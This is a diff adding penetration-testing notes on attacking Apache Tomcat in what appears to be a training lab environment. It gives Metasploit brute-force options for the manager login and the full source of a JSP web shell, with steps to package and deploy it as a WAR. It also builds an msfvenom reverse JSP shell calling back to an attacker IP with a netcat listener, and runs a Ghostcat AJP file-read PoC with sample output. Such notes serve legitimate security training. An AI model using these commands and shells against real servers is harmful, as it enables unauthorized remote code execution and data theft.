@@ -1025,3 +1025,210 @@ If successful:
 * Look for **LFI** to access `web.xml`, `tomcat-users.xml`.
 
 ---
+
+
+# ☕ Attacking Apache Tomcat
+
+## 🎯 Objective
+
+Gain RCE or file access on an externally exposed Tomcat instance (`web01.inlanefreight.local:8180`) by abusing weak/default credentials and known vulnerabilities.
+
+## 1️⃣ Tomcat Manager – Login Brute Force
+
+### 🛠️ Using Metasploit Module
+
+* **Module**: `auxiliary/scanner/http/tomcat_mgr_login`
+* **Key Options**:
+
+  ```
+  set VHOST       web01.inlanefreight.local
+  set RHOSTS      10.129.201.58
+  set RPORT       8180
+  set STOP_ON_SUCCESS true
+  set THREADS     1
+  ```
+* **Default wordlists** (Metasploit):
+
+  * Users: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
+  * Passwords: `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
+
+#### 🔍 Run and Result
+
+```text
+run
+[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
+[*] Auxiliary module execution completed
+```
+
+* Found valid credentials: **tomcat** / **admin**
+
+> **Tip**: If module behavior is unexpected, proxy via Burp/ZAP by setting  `set PROXIES HTTP:127.0.0.1:8080`.
+> Inspect Authorization headers to confirm Base64 encoding of `username:password`.
+
+
+### 🐍 Python Script Alternative
+
+* **Usage**:
+
+  ```
+  python3 mgr_brute.py \
+    -U http://web01.inlanefreight.local:8180/ \
+    -P /manager \
+    -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
+    -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+  ```
+
+## 2️⃣ WAR File Upload via Manager GUI
+
+### 🔑 Prerequisite
+
+* Valid **manager-gui** credentials (e.g., `tomcat:admin`).
+* Access to `http://web01.inlanefreight.local:8180/manager/html`.
+
+
+### 📝 Steps to Deploy a JSP Web Shell
+
+1. **Download a simple JSP shell** (e.g., `cmd.jsp`):
+
+   ```bash
+   wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+   ```
+
+   ```jsp
+   <%@ page import="java.util.*,java.io.*"%>
+   <HTML><BODY>
+   <FORM METHOD="GET" NAME="myform">
+     <INPUT TYPE="text" NAME="cmd">
+     <INPUT TYPE="submit" VALUE="Send">
+   </FORM>
+   <pre>
+   <%
+     if (request.getParameter("cmd") != null) {
+       Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+       BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+       String line = null;
+       while ((line = in.readLine()) != null) {
+         out.println(line);
+       }
+     }
+   %>
+   </pre>
+   </BODY></HTML>
+   ```
+
+2. **Package into a WAR**:
+
+   ```bash
+   zip -r backup.war cmd.jsp
+   ```
+
+3. **Log in to Manager GUI** → Browse → Select `backup.war` → Deploy.
+
+   * Context path will be `/backup`.
+
+4. **Access the shell**:
+
+   ```
+   http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+   ```
+
+   * Example via cURL:
+
+     ```bash
+     curl "http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id"
+     ```
+
+5. **Cleanup**:
+
+   * From Manager GUI, click **Undeploy** next to `/backup`.
+   * Verify removal of:
+
+     ```
+     /opt/tomcat/apache-tomcat-*/webapps/backup.war
+     /opt/tomcat/apache-tomcat-*/webapps/backup/
+     ```
+
+### 🤖 Automated WAR Upload via Metasploit
+
+* **Module**: `multi/http/tomcat_mgr_upload`
+* Automates authentication + WAR upload + payload execution.
+
+### 🛠️ Using msfvenom to Create a Reverse JSP Shell
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp \
+ lhost=10.10.14.15 lport=4443 -f war > rev_shell.war
+```
+
+* Deploy `rev_shell.war` via Manager GUI.
+* Start Netcat listener:
+
+  ```bash
+  nc -lnvp 4443
+  ```
+* Browse to shell to trigger payload:
+
+  ```
+  http://web01.inlanefreight.local:8180/backup/
+  ```
+* Gain a reverse shell as **tomcat** user.
+
+## 3️⃣ CVE-2020-1938 Ghostcat (AJP LFI)
+
+### 📌 Overview
+
+* Vulnerable versions: Tomcat < 9.0.31, < 8.5.51, < 7.0.100
+* Flaw in **AJP (Apache JServ Protocol)** listener (default port **8009**).
+* Allows reading of arbitrary files under webapps directory (e.g., `WEB-INF/web.xml`).
+
+### 🔍 Detection with Nmap
+
+```bash
+nmap -sV -p 8009,8080 app-dev.inlanefreight.local
+```
+
+* Sample output:
+
+  ```
+  8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+  8080/tcp open  http    Apache Tomcat 9.0.30
+  ```
+
+### 🧪 Exploit with Public PoC Script
+
+1. **Get the script** (e.g., `tomcat-ajp.lfi.py`).
+2. **Run against target**:
+
+   ```bash
+   python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 \
+     -f WEB-INF/web.xml
+   ```
+3. **Result**: Contents of `WEB-INF/web.xml` echo to console:
+
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <web-app ...>
+     <display-name>Welcome to Tomcat</display-name>
+     ...
+   </web-app>
+   ```
+4. **Potential next steps**:
+
+   * Read `tomcat-users.xml` if located under webapps (e.g., via path traversal).
+   * Enumerate custom application descriptors (e.g., `WEB-INF/classes/*.class`).
+   * Identify hard-coded secrets or sensitive endpoints.
+
+
+## 📌 Cleanup & Reporting Artifacts
+
+* **Document**:
+
+  * Successfully brute-forced credentials (`tomcat:admin`).
+  * Paths of uploaded shells (`/backup/cmd.jsp`, `backup.war`).
+  * Files retrieved via Ghostcat (e.g., `WEB-INF/web.xml`).
+* **Revert Changes**:
+
+  * Undeploy/remove WAR uploads.
+  * Remove any custom JSP or payload files.
+
+---
